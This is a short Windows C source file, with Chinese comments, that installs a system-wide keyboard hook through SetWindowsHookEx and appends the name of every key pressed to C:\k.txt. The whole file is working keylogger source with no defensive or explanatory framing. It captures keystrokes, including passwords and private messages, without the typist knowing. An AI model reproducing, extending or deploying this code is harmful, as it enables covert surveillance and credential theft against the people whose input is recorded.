#include"key.h"
BOOL InstallHook() {
	g_hHook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, GetModuleHandle(L"Key"), 0);
	return TRUE;
}
BOOL UninstallHook() {
	return UnhookWindowsHookEx(g_hHook);

}
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode < 0 || nCode == HC_NOREMOVE)
		return CallNextHookEx(g_hHook, nCode, wParam, lParam);
	if (lParam & 0x40000000)
		return CallNextHookEx(g_hHook, nCode, wParam, lParam);
	//获取按键的名称
	char szKeyName[100];
	GetKeyNameTextA(lParam, szKeyName, 100);
	//打开文件
	FILE* fp;
	if (fopen_s(&fp, "C:\\k.txt", "a") != 0 || fp == NULL) {
		printf("Error opening file.\n");
		return -1; // 或者其他适当的错误处理方式
	}

	//写入文件
	char szWriteText[100] = {0};
	sprintf_s(szWriteText, "%s\r\n", szKeyName);


	fwrite(szWriteText, 1, strlen(szWriteText), fp);
	//关闭文件
	fclose(fp);
	return CallNextHookEx(g_hHook, nCode, wParam, lParam);


}